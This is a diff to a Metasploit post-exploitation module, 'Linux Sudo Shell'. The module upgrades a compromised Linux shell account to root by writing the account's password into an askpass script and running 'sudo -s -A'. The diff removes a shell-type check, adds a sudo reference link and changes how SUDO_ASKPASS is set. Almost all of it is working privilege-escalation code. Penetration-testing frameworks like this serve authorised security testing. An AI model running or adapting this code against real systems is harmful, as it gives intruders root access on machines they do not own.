@@ -28,12 +28,18 @@ class Metasploit3 < Msf::Post
 				'Name'          => 'Linux Sudo Shell',
 				'Description'   => %q{
 					This module attempts to upgrade a shell account to UID 0 by reusing the
-					given password and passing it to sudo.
+					given password and passing it to sudo. This technique relies on sudo
+					versions from 2008 and later which support -A.
 				},
 				'License'       => MSF_LICENSE,
 				'Author'        => [ 'todb <todb[at]metasploit.com>'],
 				'Version'       => '$Revision: $',
 				'Platform'      => [ 'linux' ],
+				'References'    => 
+					[
+						# Askpass first added March 2, 2008, looks like
+						[ 'URL', 'http://www.sudo.ws/repos/sudo/file/05780f5f71fd/sudo.h']
+					],
 				'SessionTypes'  => [ 'shell' ] # Need to test 'meterpreter'
 			))
 	end
@@ -50,14 +56,7 @@ class Metasploit3 < Msf::Post
 			print_error "No sudo binary available. Aborting."
 			return
 		end
-		@current_shell = cmd_exec("echo $SHELL")
-		if @current_shell =~ /(bsh|bash|zsh|ksh|csh|\/bin\/sh)$/
-			print_status "Current shell is `#{@current_shell}'"
-			get_root()
-		else
-			print_error "Incompatible shell `#{current_shell.to_s.strip}'"
-			return
-		end
+		get_root()
 	end
 
 	def get_root
@@ -99,11 +98,10 @@ class Metasploit3 < Msf::Post
 					cmd_exec("echo echo #{password} >> #{askpass_sh}")
 					cmd_exec("chmod +x #{askpass_sh}")
 					vprint_status "Setting environment variable."
-					if @current_shell =~ /csh/
-						cmd_exec("setenv SUDO_ASKPASS #{askpass_sh}") 
-					else # Bash is the default behavior
-						cmd_exec("export SUDO_ASKPASS=#{askpass_sh}") 
-					end
+					# Bruteforce-set the environment variable? is cmd_exec() always
+					# going to be in the context of /bin/sh ?
+					askpass_env = cmd_exec("setenv SUDO_ASKPASS #{askpass_sh}") 
+					cmd_exec("export SUDO_ASKPASS=#{askpass_sh}") if askpass_env.to_s.empty?
 					vprint_status "Executing sudo -s -A"
 					cmd_exec("sudo -s -A")
 					vprint_status "Deleting the askpass script."
